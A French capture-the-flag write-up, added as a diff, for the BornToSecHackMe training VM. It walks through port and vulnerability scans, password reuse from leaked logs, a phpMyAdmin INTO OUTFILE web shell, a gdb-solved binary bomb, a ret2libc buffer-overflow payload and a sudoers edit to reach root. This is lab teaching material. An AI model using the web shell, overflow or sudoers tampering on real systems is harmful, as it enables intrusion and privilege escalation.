@@ -1,0 +1,233 @@
+	Writeup 1
+
+	1. Scan de la cible
+Pour obtenir un minimum d'information pour bien commencer on utilise nmap
+> nmap -sS x.x.x.x
+PORT    STATE SERVICE  VERSION
+21/tcp  open  ftp      vsftpd 2.0.8 or later
+22/tcp  open  ssh      OpenSSH 5.9p1 Debian 5ubuntu1.7 (Ubuntu Linux; protocol 2.0)
+80/tcp  open  http     Apache httpd 2.2.22 ((Ubuntu))
+143/tcp open  imap     Dovecot imapd
+443/tcp open  ssl/http Apache httpd 2.2.22
+993/tcp open  ssl/imap Dovecot imapd
+On decouvre divers services sur la machine :
+- http il y a un site web accessible
+- ssh un shell peux etre obtenu si on possede un login et un mot de passe
+
+
+	2. Scan des vulnérabilités
+
+Sur l'OS Kali, on utilise Nikto pour obtenir diverses failles potentielles
+> nikto -h https://x.x.x.x
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          10.13.0.181
++ Target Hostname:    10.13.0.181
++ Target Port:        443
++ Server: Apache/2.2.22 (Ubuntu)
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The site uses SSL and the Strict-Transport-Security HTTP header is not defined.
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ The Content-Encoding header is set to "deflate" this may mean that the server is vulnerable to the BREACH attack.
++ Apache/2.2.22 appears to be outdated (current is at least Apache/2.4.12). Apache 2.0.65 (final release) and 2.2.29 are also current.
++ Hostname '10.13.0.181' does not match certificate's names: BornToSec
++ Allowed HTTP Methods: POST, OPTIONS, GET, HEAD
++ Retrieved x-powered-by header: PHP/5.3.10-1ubuntu3.20
++ Cookie PHPSESSID created without the secure flag
++ Cookie PHPSESSID created without the httponly flag
++ Cookie mlf2_usersettings created without the secure flag
++ Cookie mlf2_usersettings created without the httponly flag
++ Cookie mlf2_last_visit created without the secure flag
++ Cookie mlf2_last_visit created without the httponly flag
++ OSVDB-3092: /forum/: This might be interesting...
++ Cookie SQMSESSID created without the secure flag
++ Cookie SQMSESSID created without the httponly flag
++ OSVDB-3093: /webmail/src/read_body.php: SquirrelMail found
++ Server leaks inodes via ETags, header found with file /icons/README, inode: 47542, size: 5108, mtime: Tue Aug 28 10:48:10 2007
++ OSVDB-3233: /icons/README: Apache default file found.
++ /phpmyadmin/: phpMyAdmin directory found
++ OSVDB-3092: /phpmyadmin/Documentation.html: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.
++ 8496 requests: 0 error(s) and 23 item(s) reported on remote host
++ End Time:           2019-05-13 14:29:58 (GMT0) (111 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+
+On découvre liées au port 443 de la vm l’existences de :
+- un forum "/forum/index.php"
+- un service d'envoi d'email Squirrel "/webmail/src/login.php"
+- phpMyAdmin
+
+	3. Récupération d'un compte sur le forum
+
+On retrouve en navigant sur le forum, un post relativement intrigant:
+# Probleme login ?
+# by lmezard, Thursday, October 08, 2015, 00:10 (1350 days ago)
+Ce dernier est un log du daemon sshd et cron, deux lignes sont intéressantes :
+
+Invalid user adam from 104.245.98.119
+Failed password for invalid user admin from 104.245.98.119 port 32271 ssh2
+
+La première semble indiquer qu'un login invalide vient d'être entré <login>
+La deuxième semble indiquer qu'un mot de passe invalide vient d'être entré <admin>
+On retrouve les lignes suivantes :
+
+Oct 5 08:45:26 BornToSecHackMe sshd[7547]: Invalid user adam from 11.202.39.38
+...
+Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Failed password for invalid user !q\]Ej?*5K5cy*AJ from 161.202.39.38 port 57764 ssh2
+
+On envisage qu'un utilisateur ait tenté de se connecter et se soit trompé de login, mais pas de mot de passe.
+Puisqu'on connait la liste des différents utilisateurs sur le forum, après avoir testé tous les users avec ce mot de passe, on obtient un compte :
+lmezard !q\]Ej?*5K5cy*AJ
+
+	4. Access root a la base de données du forum
+
+Sur le compte de lmezard on découvre son adresse email : laurie@borntosec.net
+On se connecte sur la messagerie (SquirrelMail "/webmail/src/login.php") et trouve le message suivant :
+
+Hey Laurie,
+You cant connect to the databases now. Use root/Fg-'kKXBj87E:aJ$
+Best regards.
+
+	5. Exécuter des commandes sur le serveur
+
+Sur phpmyadmin, on va injecter du code dans un fichier afin d’accéder à la machine hôte.
+
+Avec la requête : Select "x" into outfile "file.php" on peut créer un fichier (contenant ce qu'on veut écrire) dans le dossier mysql de l'host du site.
+On pourra ensuite exécuter le code du fichier en entrant directement son url.
+
+Évidemment le dossier mysql n'est pas dans le dossier du site il n'est donc pas accessible.
+Il faut trouver un dossier accessible (comme /forum/x/) sur lequel tous les utilisateurs ont le droit d'écriture.
+
+En cherchant les dossiers habituels des sites webs on apprend qu’il est courant sur Linux d'avoir ses sources dans "/var/www/"
+Avec des requêtes sql on découvre que le dossier "var/www/forum" existe bien.
+
+On utilise dirb pour trouver les dossiers de /forum.
+On essaye donc la requête sql sur les dossiers un par un et on découvre qu'on peut écrire sur le dossier "forum/templates_c/".
+
+On n’a plus qu'à insérer du code php dans un nouveau fichier :
+
+SELECT "<?php system($_GET['cmd']); ?> " Into outfile "/var/www/forum/templates_c/hack.php"
+
+Le fichier a bien été créé, maintenant on peut y accéder en entrant l'url https://x.x.x.x/forum/templates_c/hack.php, et avec un paramètre “cmd”, exécuter des commandes shell.
+En se baladant un peu, on trouve le dossier LOOKATME contenant des identifiants pour se logger sur l’iso :  lmezard:G!@M6f4Eatau{sF"
+
+	6. fun
+
+Une fois connecte à l’iso sur le compte de lmezard, un ls nous affiche un fichier fun et un fichier README expliquant que le challenge nous donnera le mot de passe de Laurie pour se connecter en SSH.
+
+Le fichier fun contient beaucoup de lettres et de chiffres dans le désordre, mais à l’aide de la commande grep on a pu relever tous les appels a la fonction getme() renvoyant des lettres
+Une fois toutes les lettres rassemblées on tente de trouver un ordre et aboutit au mot de passe “Iheartpwnage”
+
+Après cryptage - echo -n “Iheartpwnage” | shasum -a 256 - on trouve :
+330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4
+
+	7. bomb
+
+Sur le ssh de laurie on retrouve la bomb:
+Il s’agit d’un exécutable qui attend un input de l’utilisateur.
+Le README indique que le mot de passe donner par la bomb est le mot de passe ssh de thor
+Avec gdb, nous allons décompiler le programme afin de comprendre son fonctionnement.
+En décomposant le main se dévoile une structure en 6 phases, que l’on décompile une par une pour les résoudre.
+
+Pour chaque phase, on repère les endroits où une explosion de la bombe surgit, qui sont situés en général après une comparaison, dont la seconde issue permet de sauter cette explosion pour atterrir plus loin dans le code.
+
+> Phase 1 :
+La comparaison est simple et directe, entre notre input et une chaîne de caractères, “Public speaking is very easy.”. C’est cette chaine que l’on doit passer en input.
+
+> Phase 2 :
+Dans la phase 2, on constate que le programme attend 6 nombres, mis en forme de cette façon : %d %d %d %d %d %d.
+On entre ensuite dans une boucle qui vérifie l’égalité suivante pour chaque nombre n de notre input :
+x[n] = x[n - 1] * n
+
+Avec un n0 = 1 on obtient :
+
+x[1] = 1   // start point
+x[2] = 1   * 2 == 2
+x[3] = 2   * 3 == 6
+x[4] = 6   * 4 == 24
+x[5] = 24  * 5 == 120
+x[6] = 120 * 6 == 720
+
+Le mot de passe est donc 1 2 6 24 120 720.
+
+> Phase 3 :
+
+La phase 3 commence par un scan qui vérifie que le format de l’input est bien %d %c %d.
+Selon l’indice du Readme qui accompagne la bombe le %c correspond à ’b’.
+Soient x, b, c le triplet recherché.
+
+La ligne suivant est déterminante :
+DWORD PTR [eax*4+0x80497e8]
+En fonction du premier nombre, on atterrira à une adresse différente.
+Si on saute cette ligne, le mécanisme ne fonctionne plus. Pour l’atteindre, on doit passer ce petit test :  
+0x08048bc9 <+49>:	cmp    DWORD PTR [ebp-0xc],0x7
+Soit : x < 7.
+
+La ligne DWORD PTR [eax*4+0x80497e8] peut renvoyer à différentes parties du code selon notre premier input. Pour chaque destination possible, une lettre et un nombre seront comparés au reste de notre input.
+
+Pour chaque possibilité de type
+0x08048c00 <+104>:	mov    bl,0x62
+c’est-à-dire avec un ‘b’ final en 2e position, on calcule
+adresse de la destination - 0x80497e8 / 4 = x.
+Le seul résultat respectant la condition x < 7 correspond au triplet gagnant : 1 b 214.
+Il se trouve à cette adresse :
+0x08048c00 <+104>:	mov    bl,0x62
+0x08048c02 <+106>:	cmp    DWORD PTR [ebp-0x4],0xd6
+
+> Phase 4 :
+
+La phase 4 calcule le terme de la suite de Fibonacci Un = Un-1 + Un-2 et le compare à 55, soit U9. Le mon de passe est donc 9.
+
+> Phase 5 :
+
+On constate que le programme attend une suite de 6 caractères.
+A la fin du programme, une comparaison avec “giants” est effectuée.
+Entrer directement “giants” ne fonctionne pas. En effet, une suite de transformations agit sur l’input avant la comparaison. En utilisant un petit programme (voir phase5.c), on trouve la chaîne “opekmq”. 
+
+> Phase 6 :
+
+La phase 6 attend un mot de passe constitué de 6 chiffres. 
+Elle vérifie qu’ils sont tous inférieurs ou égaux à 6 et positifs. 
+La réponse est donc une permutation de 1, 2, 3, 4, 5, 6. 
+A tâtons avec des breakpoints, on comprend qu’à chaque nombre entré en est associé un autre :
+1 => 255
+2 => 725
+3 => 301
+4 => 997
+5 => 212
+6 => 432
+A cette ligne
+0x08048dec <+84>:	cmp    eax,DWORD PTR [esi+ebx*4]
+ils seront comparés.
+On doit les rangés par ordre décroissant : 4 2 6 3 1 5.
+
+La bombe est désarmorcée. 
+Après un dernier ajustement lunaire trouvé sur le forum, on peut enfin se connecter via ssh en tant que thor avec le mot de passe: Publicspeakingisveryeasy126241207201b2149opekmq426135
+
+	8. turtle 
+
+Une fois connectés, un fichier turtle et un stylo font apparaître sur une feuille les lettres SLASH.
+Après “digestion” en md5 on obtient: 646da671ca01bb5d84dbb5fb2238dc8e.
+le README indique qu'avec ce mot de passe on se connectera à la session de zaz.
+
+	9. exploit_me
+
+Sur la session de zaz on trouve un exécutable "exploit_me" qui  affiche le premier argument qu'il reçoit.
+Le programme segfault si il reçoit un argument de plus de 140 caractères.
+
+Le fichier appartient au root, et le suid est set pour le groupe zaz, on peut donc utiliser ce segfault pour faire apparaître un shell root.
+
+On utilise gdb pour trouver l'adresse mémoire de ma fonction "system()" et de /bin/sh : 0xb7e6b060 et 0xb7f8cc58
+On lance le programme avec 140 caractères et les adresses (inversées à cause du little endian) en argument.
+./exploit_me `perl -e 'print "A"x140 . "\x60\xb0\xe6\xb7" . "AAAA" . "\x58\xcc\xf8\xb7"'`
+
+On obtient un shell root.
+Il nous faut encore devenir root en tant que uid.
+Pour cela on modifie les droits de /etc/sudoers.
+	chmod 666 /etc/sudoers
+On ajoute zaz juste en dessous de root, avec les mêmes droits.
+Puis on repasse le fichier le fichier en droits restreints avec chmod 440 /etc/sudoers.
+On peut alors faire
+sudo su
+Avec le mot de passe de zaz 646da671ca01bb5d84dbb5fb2238dc8e, nous voilà root !
